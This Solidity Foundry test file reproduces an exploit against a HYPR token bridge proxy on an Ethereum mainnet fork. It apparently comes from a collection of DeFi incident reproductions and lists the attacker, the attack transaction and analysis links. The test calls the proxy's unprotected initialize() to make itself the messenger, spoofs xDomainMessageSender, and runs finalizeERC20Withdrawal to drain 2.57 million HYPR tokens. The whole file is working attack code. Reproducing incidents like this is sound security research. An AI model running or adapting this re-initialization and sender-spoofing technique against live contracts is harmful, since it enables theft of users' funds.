// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~200K USD$
// Attacker : https://etherscan.io/address/0x3ea6ba6d3415e4dfd380516c799aafa94e420519
// Attack Contract : https://etherscan.io/address/0xba6fa6e8500cd8eeda8ebb9dfbcc554ff4a3eb77
// Vulnerable Contract : https://etherscan.io/address/0x40c31236b228935b0329eff066b1ad96e319595e
// Attack Tx : https://explorer.phalcon.xyz/tx/eth/0x51ce3d9cfc85c1f6a532b908bb2debb16c7569eb8b76effe614016aac6635f65

// @Analysis
// https://twitter.com/BlockSecTeam/status/1735197818883588574
// https://twitter.com/MevRefund/status/1734791082376941810

interface IL1ChugSplashProxy {
    function initialize(address _messenger) external;

    function finalizeERC20Withdrawal(
        address _l1Token,
        address _l2Token,
        address _from,
        address _to,
        uint256 _amount,
        bytes memory _extraData
    ) external;
}

contract ContractTest is Test {
    IERC20 private constant HYPR =
        IERC20(0x31aDdA225642a8f4D7e90d4152BE6661ab22a5a2);
    IL1ChugSplashProxy private constant ChugSplash =
        IL1ChugSplashProxy(0x40C31236B228935b0329eFF066B1AD96e319595e);
    address private constant messageSender =
        0x4200000000000000000000000000000000000010;
    address private constant l2Token =
        0xD7a421A6786cF4951a8FaE10385680222D63f89a;

    function setUp() public {
        vm.createSelectFork("mainnet", 18774584);
        vm.label(address(HYPR), "HYPR");
        vm.label(address(ChugSplash), "ChugSplash");
        vm.label(messageSender, "messageSender");
        vm.label(l2Token, "l2Token");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "Exploiter HYPR balance before attack",
            HYPR.balanceOf(address(this)),
            HYPR.decimals()
        );

        ChugSplash.initialize(address(this));
        ChugSplash.finalizeERC20Withdrawal(
            address(HYPR),
            l2Token,
            address(ChugSplash),
            address(this),
            2_570_000 * 1e18,
            bytes("")
        );

        emit log_named_decimal_uint(
            "Exploiter HYPR balance after attack",
            HYPR.balanceOf(address(this)),
            HYPR.decimals()
        );
    }

    function xDomainMessageSender() external view returns (address) {
        return messageSender;
    }
}
